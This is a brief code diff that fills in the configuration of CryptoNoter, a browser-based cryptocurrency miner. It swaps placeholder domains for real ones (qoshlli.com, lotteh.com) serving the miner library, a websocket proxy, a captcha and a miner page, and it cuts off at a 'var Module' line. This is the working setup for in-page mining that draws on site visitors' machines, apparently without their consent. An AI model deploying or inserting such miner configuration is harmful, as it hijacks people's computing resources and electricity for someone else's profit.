@@ -1,9 +1,9 @@
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://%CryptoNoter_domain%/lib/",
-    WEBSOCKET_SHARDS: [["wss://%CryptoNoter_domain%/proxy"]],
-    CAPTCHA_URL: "https://%CryptoNoter_domain%/captcha/",
-    MINER_URL: "https://%CryptoNoter_domain%/media/miner.html"
+    LIB_URL: "https://qoshlli.com/web/lib/",
+    WEBSOCKET_SHARDS: [["wss://lotteh.com/proxy"]],
+    CAPTCHA_URL: "https://qoshlli.com/web/captcha/",
+    MINER_URL: "https://qoshlli.com/web/media/miner.html"
 };
 var Module = {
     locateFile: (function (path) {
